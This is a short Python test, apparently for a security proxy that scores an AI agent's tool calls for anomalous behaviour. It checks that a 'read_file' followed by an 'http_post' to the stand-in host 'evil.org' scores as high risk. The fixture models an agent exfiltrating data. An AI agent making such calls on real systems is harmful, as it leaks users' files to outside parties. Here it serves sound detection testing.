from cerberus.behavioral.features import FeatureExtractor
from cerberus.behavioral.scorers.rule_based import RuleBasedScorer
from cerberus.behavioral.scorers.markov import MarkovScorer
from cerberus.behavioral.ensemble import EnsembleScorer
from cerberus.proxy.models import ToolCallEvent

def test_full_behavioral_pipeline():
    event = ToolCallEvent(
        session_id="s1",
        agent_id="a1",
        tool_name="http_post",
        tool_server="webhook-server",
        parameters={"url": "http://evil.org"},
        destination_domain="evil.org",
        sequence_position=1
    )
    markov_f, if_f, rule_f = FeatureExtractor.extract_all(event, ["read_file"], 1, 0, {})
    
    r_score, r_factors = RuleBasedScorer.score(rule_f)
    m_scorer = MarkovScorer()
    m_score, m_factors = m_scorer.score(markov_f)
    
    ensemble = EnsembleScorer()
    final_score, factors = ensemble.combine(r_score, m_score, 0.0, r_factors, m_factors, [])
    assert final_score >= 0.70
